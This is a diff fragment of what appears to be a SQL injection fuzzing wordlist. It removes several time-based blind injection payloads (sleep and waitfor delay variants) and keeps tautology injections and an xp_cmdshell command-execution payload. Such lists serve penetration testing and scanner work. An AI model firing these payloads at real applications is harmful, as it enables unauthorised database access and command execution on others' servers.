@@ -276,11 +276,3 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 ' or ''='
 ' or 3=3
  or 3=3 --
-')) or sleep(5)='
-;waitfor delay '0:0:5'--
-);waitfor delay '0:0:5'--
-';waitfor delay '0:0:5'--
-";waitfor delay '0:0:5'--
-');waitfor delay '0:0:5'--
-");waitfor delay '0:0:5'--
-));waitfor delay '0:0:5'--
